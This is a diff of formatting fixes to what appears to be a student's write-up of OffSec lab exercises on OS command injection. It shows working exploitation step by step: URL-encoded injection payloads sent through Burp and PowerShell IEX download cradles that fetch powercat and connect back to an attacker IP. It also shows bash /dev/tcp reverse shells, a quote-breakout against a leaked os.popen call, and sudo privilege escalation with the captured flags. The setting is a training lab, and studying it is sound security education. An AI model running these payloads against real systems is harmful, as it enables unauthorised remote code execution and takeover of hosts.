 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.220.189:8000/">http://192.168.220.189:8000/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>Archive=git+version%3Bipconfig</p>
-<pre><code>
-Interesting results!
+Connection: close
+
+Archive=git+version%3Bipconfig
 </code></pre>
-<p>HTTP/1.1 200 OK
+<p>Interesting results!</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 22:23:50 GMT
 Content-Length: 377
 Content-Type: text/plain; charset=utf-8
-Connection: close</p>
-<p>Repository successfully cloned with command: git version;ipconfig and output: git version 2.36.1.windows.1</p>
-<p>Windows IP Configuration</p>
-<p>Ethernet adapter Ethernet0:</p>
-<p>   Connection-specific DNS Suffix  . : 
+Connection: close
+
+Repository successfully cloned with command: git version;ipconfig and output: git version 2.36.1.windows.1
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
    IPv4 Address. . . . . . . . . . . : 192.168.220.189
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 192.168.220.254</p>
-<pre><code>
-What we can assume, is the filter checks if `git` is executed and little else, leverage it and find out more about the env. This will determine if CMD or PS is exec.
+   Default Gateway . . . . . . . . . : 192.168.220.254
 </code></pre>
-<p>(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell</p>
-<pre><code>
+<p>What we can assume, is the filter checks if <code>git</code> is executed and little else, leverage it and find out more about the env. This will determine if CMD or PS is exec.</p>
+<pre><code>(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec]
-└─$ urlencode &#39;(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell&#39;</p>
-<p>%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell</p>
-<pre><code>
-In Burp;
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ urlencode &#39;(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell&#39;
+
+%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
 </code></pre>
-<p>POST /archive HTTP/1.1
+<p>In Burp;</p>
+<pre><code class="language-http">POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 110
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.220.189:8000">http://192.168.220.189:8000</a>
+Origin: http://192.168.220.189:8000
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.220.189:8000/">http://192.168.220.189:8000/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>Archive=git+version%3B%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell</p>
-<pre><code>
-Retruns;
+Connection: close
+
+Archive=git+version%3B%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
 </code></pre>
-<p>HTTP/1.1 200 OK
+<p>Retruns;</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 22:33:38 GMT
 Content-Length: 161
 Content-Type: text/plain; charset=utf-8
-Connection: close</p>
-<p>Repository successfully cloned with command: git version;(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
+Connection: close
+
+Repository successfully cloned with command: git version;(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
  and output: git version 2.36.1.windows.1
-PowerShell</p>
-<pre><code>
-Looks like PowerShell. Obtain a reverse shell with `powercat` , the powershell implementation of netcat included in Kali. Copy it to working dir and serve it with Python.
+PowerShell
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/shells]
-└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .</p>
-<p>┌──(operator㉿labhost)-[~/OffSec/shells]
+<p>Looks like PowerShell. Obtain a reverse shell with <code>powercat</code> , the powershell implementation of netcat included in Kali. Copy it to working dir and serve it with Python.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ ls
-powercat.ps1</p>
-<p>┌──(operator㉿labhost)-[~/OffSec/shells]
+powercat.ps1
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ python -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (<a href="http://0.0.0.0:80/">http://0.0.0.0:80/</a>) ...</p>
-<pre><code>
-Start the local netcat listener;
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec]
-└─$ nc -nvlp 4444<br>listening on [any] 4444 ...</p>
-<pre><code>
-Powercat served and netcat listening, time to inject our command.
+<p>Start the local netcat listener;</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
 </code></pre>
-<p>IEX (New-Object System.Net.Webclient).DownloadString(&quot;<a href="http://192.168.119.3/powercat.ps1%22);powercat">http://192.168.119.3/powercat.ps1&quot;);powercat</a> -c 192.168.119.3 -p 4444 -e powershell </p>
-<pre><code>
-URL encode as usual;
+<p>Powercat served and netcat listening, time to inject our command.</p>
+<pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&quot;http://192.168.119.3/powercat.ps1&quot;);powercat -c 192.168.119.3 -p 4444 -e powershell 
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/shells]
-└─$ urlencode &#39;IEX (New-Object System.Net.Webclient).DownloadString(&quot;<a href="http://192.168.45.223/powercat.ps1%22);powercat">http://192.168.45.223/powercat.ps1&quot;);powercat</a> -c 192.168.45.223 -p 4444 -e powershell&#39;
-IEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell</p>
-<pre><code>
-Burp req;
+<p>URL encode as usual;</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ urlencode &#39;IEX (New-Object System.Net.Webclient).DownloadString(&quot;http://192.168.45.223/powercat.ps1&quot;);powercat -c 192.168.45.223 -p 4444 -e powershell&#39;
+IEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
 </code></pre>
-<p>POST /archive HTTP/1.1
+<p>Burp req;</p>
+<pre><code class="language-http">POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 110
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.220.189:8000">http://192.168.220.189:8000</a>
+Origin: http://192.168.220.189:8000
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.220.189:8000/">http://192.168.220.189:8000/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>Archive=git+version%3BIEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell</p>
-<pre><code>
-Netcat shell returned;
+Connection: close
+
+Archive=git+version%3BIEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec]
-└─$ nc -nvlp 4444<br>listening on [any] 4444 ...
+<p>Netcat shell returned;</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
 connect to [192.168.45.223] from (UNKNOWN) [192.168.220.189] 55266
 Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.</p>
-<p>Install the latest PowerShell for new features and improvements! <a href="https://aka.ms/PSWindows">https://aka.ms/PSWindows</a></p>
-<p>PS C:\Users\Administrator\Documents\meteor&gt; </p>
-<pre><code>
-Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.
+Copyright (C) Microsoft Corporation. All rights reserved.
 
-#### OS Command Injection Exercises
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
 
-Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.
+PS C:\Users\Administrator\Documents\meteor&gt; 
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec]
-└─$ nc -nvlp 4444<br>listening on [any] 4444 ...
+<p>Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.</p>
+<h4>OS Command Injection Exercises</h4>
+<p>Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
 connect to [192.168.45.223] from (UNKNOWN) [192.168.220.189] 55266
 Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.</p>
-<p>Install the latest PowerShell for new features and improvements! <a href="https://aka.ms/PSWindows">https://aka.ms/PSWindows</a></p>
-<p>PS C:\Users\Administrator\Documents\meteor&gt; cd ....\Desktop
-cd ....\Desktop
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator\Documents\meteor&gt; cd ..\..\Desktop
+cd ..\..\Desktop
 PS C:\Users\Administrator\Desktop&gt; dir
-dir</p>
-<pre><code>Directory: C:\Users\Administrator\Desktop
-</code></pre>
-<p>Mode                 LastWriteTime         Length Name                                                                 </p>
-<hr>
-<p>-a----         8/27/2023   3:03 PM             38 secrets.txt                                                          </p>
-<p>PS C:\Users\Administrator\Desktop&gt; cat secrets.txt
-cat secrets.txt
-OS{f751a1dd339b150229843909b737bcc7}</p>
-<pre><code>
-For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
-`http://192.168.220.16`
+dir
 
-Burp captured request, sent to repeater;
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         8/27/2023   3:03 PM             38 secrets.txt                                                          
+
+
+PS C:\Users\Administrator\Desktop&gt; cat secrets.txt
+cat secrets.txt
+OS{f751a1dd339b150229843909b737bcc7}
 </code></pre>
-<p>POST /archive HTTP/1.1
+<p>For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
+<code>http://192.168.220.16</code></p>
+<p>Burp captured request, sent to repeater;</p>
+<pre><code class="language-http">POST /archive HTTP/1.1
 Host: 192.168.220.16
 Content-Length: 19
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.220.16">http://192.168.220.16</a>
+Origin: http://192.168.220.16
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.220.16/">http://192.168.220.16/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.16/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>Archive=git+version</p>
-<pre><code>
-Returns;
+Connection: close
+
+Archive=git+version
 </code></pre>
-<p>HTTP/1.1 200 OK
+<p>Returns;</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 23:16:17 GMT
 Content-Length: 88
 Content-Type: text/plain; charset=utf-8
-Connection: close</p>
-<p>Repository successfully cloned with command: git version and output: git version 2.20.1</p>
-<pre><code>
-Looks like Linux host, poke around and break stuff. The one liner;
+Connection: close
+
+Repository successfully cloned with command: git version and output: git version 2.20.1
 </code></pre>
-<p>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1&quot;</p>
-<pre><code>
-URL encode, start listener, send request;
+<p>Looks like Linux host, poke around and break stuff. The one liner;</p>
+<pre><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1&quot;
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/shells]
+<p>URL encode, start listener, send request;</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ urlencode &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1&quot;&#39;
-bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22</p>
-<pre><code>
-Burp, add to request with `%3B` for `;`;
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 </code></pre>
-<p>POST /archive HTTP/1.1
+<p>Burp, add to request with <code>%3B</code> for <code>;</code>;</p>
+<pre><code class="language-http">POST /archive HTTP/1.1
 Host: 192.168.220.16
 Content-Length: 19
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.220.16">http://192.168.220.16</a>
+Origin: http://192.168.220.16
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.220.16/">http://192.168.220.16/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.16/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>Archive=git+version%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22</p>
-<pre><code>
-Shell returned;
+Connection: close
+
+Archive=git+version%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/shells]
-└─$ nc -nvlp 4444<br>listening on [any] 4444 ...
+<p>Shell returned;</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
 connect to [192.168.45.223] from (UNKNOWN) [192.168.220.16] 50532
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
 stanley@c95818fc2884:/app$ sudo su
 sudo su
 cat /opt/config.txt
-OS{f421330abb4760d03c21d838884fbfa2}</p>
-<pre><code>
-Capstone Exercise: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
-**NOTE: Check source, remove params, test req for error output, and read carefully!!!**
-
-[Command Injection Cheat Sheet](https://github.com/payloadbox/command-injection-payload-list);
-[Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
+OS{f421330abb4760d03c21d838884fbfa2}
 </code></pre>
-<p>username=admin&amp;password=123&amp;ffa=aaaa+%2B+bbbb</p>
-<pre><code>
-Noted Python server. Removed a param, werkzeug throws a fit. Werkzeug has a [console](https://werkzeug.palletsprojects.com/en/2.3.x/debug/) page for debugging and it appears to be enabled.
-
-[Pin generating](https://ctftime.org/writeup/17955)
-
-[Werkzeug PIN exploit](https://www.daehee.com/werkzeug-console-pin-exploit/)
+<p>Capstone Exercise: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
+<strong>NOTE: Check source, remove params, test req for error output, and read carefully!!!</strong></p>
+<p><a href="https://github.com/payloadbox/command-injection-payload-list">Command Injection Cheat Sheet</a>;
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">Payload All the Things</a></p>
+<pre><code>username=admin&amp;password=123&amp;ffa=aaaa+%2B+bbbb
 </code></pre>
-<h3>First capture your reg in Burp, remove a param to error the page</h3>
-<p>POST /login HTTP/1.1
+<p>Noted Python server. Removed a param, werkzeug throws a fit. Werkzeug has a <a href="https://werkzeug.palletsprojects.com/en/2.3.x/debug/">console</a> page for debugging and it appears to be enabled.</p>
+<p><a href="https://ctftime.org/writeup/17955">Pin generating</a></p>
+<p><a href="https://www.daehee.com/werkzeug-console-pin-exploit/">Werkzeug PIN exploit</a></p>
+<pre><code>### First capture your reg in Burp, remove a param to error the page
+
+POST /login HTTP/1.1
 Host: 192.168.201.16
 Content-Length: 40
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.201.16">http://192.168.201.16</a>
+Origin: http://192.168.201.16
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.201.16/login">http://192.168.201.16/login</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.201.16/login
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>username=test&amp;password=test&amp;=aaaa%2Bbbbb</p>
-<h3>Note &#39;ffa&#39; has been removed ^</h3>
-<h3>Review resulting Error out, Python server Werkzeug 2.2.2, note the leaked source;</h3>
-<p>...
-</pre></p>
-<pre class="line current"><span class="ws">            
-</span>ffa = request.form[&#39;ffa&#39;]</pre>
-<pre class="line after"><span class="ws">            
-</span>out = os.popen(f&#39;echo &#34;{ffa}&#34;&#39;).read()</pre> # <-- IMPORTANT
-<pre class="line after"><span class="ws">            
-</span>if out == (random_string+random_string2):</pre>
-<pre class="line after"><span class="ws">                
-</span>output = &#34;FFA was correct!&#34;</pre>
-<p>...</p>
-<h3>That bit is an echo through OS Popen, manipulate &#39;&quot;&#39; open/close to execute;</h3>
-<blockquote>
-<blockquote>
-<blockquote>
-<p>ffa = &#39;&quot;; bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.223/4444 0&gt;&amp;1&quot; &quot;&#39;
-out = os.popen(f&#39;echo &quot;{ffa}&quot;&#39;).read()</p>
-</blockquote>
-</blockquote>
-</blockquote>
-<h3>urlencode</h3>
-<p>$ urlencode &#39;&quot;; bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.223/4444 0&gt;&amp;1&quot; &quot;&#39;
-%22%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22%20%22</p>
-<h3>Send with Burp</h3>
-<p>POST /login HTTP/1.1
+Connection: close
+
+username=test&amp;password=test&amp;=aaaa%2Bbbbb
+
+### Note &#39;ffa&#39; has been removed ^
+
+### Review resulting Error out, Python server Werkzeug 2.2.2, note the leaked source;
+
+...
+&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            
+&lt;/span&gt;ffa = request.form[&amp;#39;ffa&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            
+&lt;/span&gt;out = os.popen(f&amp;#39;echo &amp;#34;{ffa}&amp;#34;&amp;#39;).read()&lt;/pre&gt; # &lt;-- IMPORTANT
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            
+&lt;/span&gt;if out == (random_string+random_string2):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                
+&lt;/span&gt;output = &amp;#34;FFA was correct!&amp;#34;&lt;/pre&gt;
+...
+
+### That bit is an echo through OS Popen, manipulate &#39;&quot;&#39; open/close to execute; 
+
+&gt;&gt;&gt; ffa = &#39;&quot;; bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.223/4444 0&gt;&amp;1&quot; &quot;&#39;
+&gt;&gt;&gt; out = os.popen(f&#39;echo &quot;{ffa}&quot;&#39;).read()
+
+### urlencode
+
+$ urlencode &#39;&quot;; bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.223/4444 0&gt;&amp;1&quot; &quot;&#39;
+%22%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22%20%22
+
+### Send with Burp
+
+POST /login HTTP/1.1
 Host: 192.168.201.16
 Content-Length: 40
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.201.16">http://192.168.201.16</a>
+Origin: http://192.168.201.16
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.201.16/login">http://192.168.201.16/login</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.201.16/login
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>username=test&amp;password=test&amp;ffa=%22%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22%20%22</p>
-<h3>Back to the netcat listener...</h3>
-<p>$ netcat -nvlp 4444
+Connection: close
+
+username=test&amp;password=test&amp;ffa=%22%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22%20%22
+
+### Back to the netcat listener...
+
+$ netcat -nvlp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.223] from (UNKNOWN) [192.168.201.16] 51218
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo <command>&quot;.
-See &quot;man sudo_root&quot; for details.</p>
-<p>yelnats@97ca26601f06:/app$ sudo -l
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+yelnats@97ca26601f06:/app$ sudo -l
 sudo -l
 Matching Defaults entries for yelnats on 97ca26601f06:
     env_reset, mail_badpass,
-    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</p>
-<p>User yelnats may run the following commands on 97ca26601f06:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User yelnats may run the following commands on 97ca26601f06:
     (ALL : ALL) ALL
     (ALL) NOPASSWD: ALL
 yelnats@97ca26601f06:/app$ sudo su
@@ -2297,15 +2315,16 @@ sudo su
 ls /root/
 flag.txt
 cat /root/flag.txt
-OS{01b3ec7e0102b86e2662927052bc27a9}</p>
-<h3>Success!!!!</h3>
-<pre><code>
-Capstone Exercise: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\\inetpub.
+OS{01b3ec7e0102b86e2662927052bc27a9}
+
+### Success!!!!
 </code></pre>
-<h3>Enumerate web server</h3>
-<p>$ sudo nmap -v -sS -O -sV 192.168.201.192
+<p>Capstone Exercise: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\inetpub.</p>
+<pre><code>### Enumerate web server
+
+$ sudo nmap -v -sS -O -sV 192.168.201.192
 [sudo] password for operator: 
-Starting Nmap 7.94 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2023-08-29 08:50 PDT
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 08:50 PDT
 NSE: Loaded 46 scripts for scanning.
 Initiating Ping Scan at 08:50
 Scanning 192.168.201.192 [4 ports]
@@ -2342,7 +2361,7 @@ PORT     STATE SERVICE       VERSION
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds?
 8000/tcp open  http          Microsoft IIS httpd 10.0
-No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 TCP/IP fingerprint:
 OS:SCAN(V=7.94%E=4%D=8/29%OT=80%CT=1%CU=35477%PV=Y%DS=4%DC=I%G=Y%TM=64EE13E
 OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%TS=A)OPS(O1=M551NW
@@ -2351,104 +2370,134 @@ OS:51ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%
 OS:T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
 OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
 OS:N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=70E5%RU
-OS:D=G)IE(R=N)</p>
-<p>Uptime guess: 0.021 days (since Tue Aug 29 08:21:18 2023)
+OS:D=G)IE(R=N)
+
+Uptime guess: 0.021 days (since Tue Aug 29 08:21:18 2023)
 Network Distance: 4 hops
 TCP Sequence Prediction: Difficulty=260 (Good luck!)
